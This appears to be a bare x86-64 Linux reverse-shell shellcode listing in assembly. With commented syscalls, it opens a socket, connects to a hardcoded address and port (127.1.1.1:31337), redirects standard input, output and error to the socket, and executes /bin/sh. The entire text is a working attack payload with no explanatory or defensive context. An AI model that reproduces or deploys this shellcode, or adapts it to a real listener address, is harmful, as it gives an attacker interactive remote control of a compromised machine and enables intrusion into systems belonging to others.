; s = socket(2, 1, 0)
push 0x29
pop rax
cdq
push 0x2
pop rdi
push 0x1
pop rsi
syscall
; connect(s, [2, port, ip], 16)
xchg rax, rdi
push 0x101017f ; ip
push word 0x697a ; port
push word 0x2
push rsp
pop rsi
mov dl, 0x10
mov al, 0x2a
syscall
; dup2(s, {2, 1, 0});
mov esi, edi
loop:
mov al, 0x21
syscall
dec esi
jns loop
; execve("/bin/sh", 0, 0)
xor esi, esi
push rsi
mov rbx,0x68732f2f6e69622f
push rbx
push rsp
pop rdi
cdq
mov al, 0x3b
syscall
